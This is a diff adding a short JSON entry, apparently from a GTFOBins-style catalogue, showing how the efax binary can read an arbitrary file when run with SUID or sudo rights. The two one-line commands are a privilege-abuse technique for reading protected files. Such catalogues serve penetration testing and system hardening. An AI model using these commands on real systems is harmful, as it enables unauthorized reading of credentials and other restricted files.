@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "suid": [
+      {
+        
+        "code": "LFILE=file_to_read\n./efax -d \"$LFILE\"\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "LFILE=file_to_read\nsudo efax -d \"$LFILE\"\n"
+      }
+    ]
+  }
+}
